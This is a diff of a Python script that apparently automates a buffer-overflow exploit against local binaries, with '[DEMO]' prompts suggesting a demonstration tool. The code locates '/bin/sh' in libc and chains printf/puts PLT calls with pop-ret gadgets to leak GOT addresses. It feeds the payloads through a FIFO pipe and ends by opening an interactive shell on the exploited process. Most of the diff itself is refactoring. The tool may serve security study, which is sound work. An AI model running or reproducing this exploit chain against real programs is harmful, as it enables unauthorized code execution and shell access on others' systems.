@@ -3,10 +3,12 @@ from os import path
 import click
 from find_segfault import find_segfault
 from bin_handler import Bin_handler
+from bin_handler import search_string
 from evil_payload_handler import Evil_payload_handler
-from string_handler import search_string_in_file
+from evil_payload_handler import has_null_bytes
 from gadget_finder import Gadget_finder
 from process_handler import Process_handler
+from generate_random_payload import Fifo_handler
 
 
 def hex_to_int(hex_str=''):
@@ -16,12 +18,6 @@ def hex_to_int(hex_str=''):
 def click_confirm(message=""):
     click.confirm("\n[DEMO] " + message, default="y")
     print("")
-
-
-def has_null_bytes(hexstr):
-    if "00" in hexstr:
-        return True
-    return False
 
 
 def cleanup(payload_name):
@@ -45,7 +41,12 @@ def validate_program():
     return program_name
 
 
-def validate_probe_mode():
+def validate_probe_mode(probe_mode=4):
+    valid_responses = [1, 2, 3, 4]
+
+    if probe_mode in valid_responses:
+        return probe_mode
+
     probe_mode = 0
     print("")
     print("Please select method of probing for buffer overflow:")
@@ -57,7 +58,7 @@ def validate_probe_mode():
     while valid_probing_mode is False:
         probe_mode = click.prompt('Method:', type=int, default=4)
         print("")
-        if probe_mode in [1, 2, 3, 4]:
+        if probe_mode in valid_responses:
             valid_probing_mode = True
         else:
             print('Invalid method, try again')
@@ -94,7 +95,7 @@ bin_arch = bh.arch
 
 print("The architect is:", bin_arch)
 
-probe_mode = validate_probe_mode()
+probe_mode = validate_probe_mode(4)
 
 # NOTE: we are not able to automate max payload size value calculation
 max_payload_size = validate_max_payload_size()
@@ -104,6 +105,7 @@ max_payload_size = validate_max_payload_size()
 # get filename if 2 and 3 are selected
 payload_name = ''
 if probe_mode == 2 or probe_mode == 3:
+    print("")
     payload_name = click.prompt('Please enter name of payload file',
                                 type=str)
 
@@ -239,58 +241,56 @@ rodata_address_int = hex_to_int(rodata_address)
 rodata_start_int = hex_to_int(rodata_start)
 rodata_end_int = rodata_start_int + hex_to_int(rodata_end)
 
-binsh_offset_int = search_string_in_file(bh.libc_path,
-                                         "/bin/sh",
-                                         rodata_start_int,
-                                         rodata_end_int)
+binsh_offset_int = search_string(bh.libc_path,
+                                 "/bin/sh",
+                                 rodata_start_int,
+                                 rodata_end_int)
 
 binsh_offset_hex = hex(rodata_address_int + binsh_offset_int)
 
 print("Offset of /bin/sh", binsh_offset_hex)
 
-evil = Evil_payload_handler(max_payload_size, segfault_offset)
+first_evil = Evil_payload_handler(max_payload_size, segfault_offset, bin_arch)
 if found_printf:
-    evil.add_content(hex_to_int(printf_plt))
+    first_evil.add_content(hex_to_int(printf_plt))
 else:
-    evil.add_content(hex_to_int(puts_plt))
+    first_evil.add_content(hex_to_int(puts_plt))
 
 # random address for testing purpose
 if found_str_address > 0:
 
     # make payload first print random string, then print got address
     # gadget to pop
-    evil.add_content(popregret_address)
-    evil.add_content(found_str_address)
+    first_evil.add_content(popregret_address)
+    first_evil.add_content(found_str_address)
 
     if found_printf:
-        evil.add_content(hex_to_int(printf_plt))
+        first_evil.add_content(hex_to_int(printf_plt))
     else:
-        evil.add_content(hex_to_int(puts_plt))
+        first_evil.add_content(hex_to_int(puts_plt))
 
-    evil.add_content(popregret_address)
+    first_evil.add_content(popregret_address)
     if found_printf:
-        evil.add_content(hex_to_int(printf_got))
+        first_evil.add_content(hex_to_int(printf_got))
     else:
-        evil.add_content(hex_to_int(puts_got))
+        first_evil.add_content(hex_to_int(puts_got))
 
     # put address to start of the program
-    evil.add_content(hex_to_int(sstart_address))
-    evil.add_content(found_str_address)
-    evil.add_content(found_str_address)
-    evil.add_content(found_str_address)
+    first_evil.add_content(hex_to_int(sstart_address))
+    first_evil.add_content(found_str_address)
+    first_evil.add_content(found_str_address)
+    first_evil.add_content(found_str_address)
 
 else:
     # TODO: need to find a string that has a valid address
     print("this part of logic is incomplete")
 
 # use fifo pipe instead
-evil.write_to_plaintext("debug_" + program_name + "_payload_1")
+first_evil.write_to_plaintext("debug_" + program_name + "_payload_1")
 
-try:
-    os.unlink(payload_name)
-except OSError:
-    pass
-os.mkfifo(payload_name)
+phandle = Fifo_handler(payload_name)
+phandle.unlink()
+phandle.create_new()
 
 click_confirm('Press any key to begin exploit')
 
@@ -302,8 +302,8 @@ proc = Process_handler(program_name)
 # use payload_name as argument
 proc.process(payload_name)
 
-phandle = open(f"./{payload_name}", 'wb', 0)
-phandle.write(evil.get_payload())
+phandle.open()
+phandle.write(first_evil.get_payload())
 print("First payload is written")
 
 tempstr = payload_name + "\n"
@@ -376,5 +376,6 @@ second_evil.write_to_plaintext("debug_" + program_name + "_payload_2")
 click_confirm('Press any key to get interactive shell')
 
 proc.interactive()
+phandle.close()
 
 cleanup(payload_name)
